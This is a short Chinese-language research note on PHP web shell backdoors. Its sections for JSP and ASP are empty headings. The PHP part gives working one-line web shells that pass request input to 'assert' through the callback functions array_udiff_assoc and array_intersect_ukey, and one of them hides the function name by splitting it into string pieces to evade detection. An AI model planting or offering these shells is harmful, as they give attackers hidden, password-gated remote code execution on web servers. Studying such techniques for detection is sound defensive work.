WebShell后门研究

## 0x01 PHP篇

### 可做后门的回调函数

- array_udiff_assoc

```
array_udiff_assoc(array("phpinfo();"), array(1), "assert");
```

客户端一句话

```
<?php
/**
* Noticed: (PHP 5 >= 5.4.0, PHP 7)
*
*/
$password = "LandGrey";
array_udiff_assoc(array($_REQUEST[$password]), array(1), "assert");
?>
```

- array_intersect_ukey

```
<?php
/**
 * Noticed: (PHP 5 >= 5.4.0, PHP 7)
 *
 */
$password = "LandGrey";
$ch = explode(".","hello.ass.world.er.t");
array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch[1].$ch[3].$ch[4]);
?>
```

## 0x02 JSP篇

## 0x03 ASP篇
